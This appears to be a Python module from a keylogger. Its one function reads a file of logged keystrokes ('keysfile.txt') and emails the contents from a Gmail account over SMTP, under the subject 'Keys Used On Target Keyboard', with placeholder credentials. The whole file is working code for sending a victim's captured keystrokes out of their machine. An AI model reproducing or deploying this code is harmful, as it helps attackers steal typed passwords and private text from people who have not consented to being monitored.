import smtplib
from email.header import Header
from email.mime.text import MIMEText
from getpass import getpass



def send_email():
    from_id = "enter from email address"
    to_id = "enter to email address"
    password = "enter password of from email address"

    with open("keysfile.txt") as kf:
        data = kf.read()
    kf.close

    msg = MIMEText(data)
    msg['Subject'] = Header("Keys Used On Target Keyboard")
    msg['From'] = from_id
    msg['To'] = to_id

    s = smtplib.SMTP_SSL("smtp.gmail.com", 465)#ports 465 and 587 are used for email
    s.login(from_id, password)
    s.sendmail(from_id, to_id, str(msg))
    s.quit()
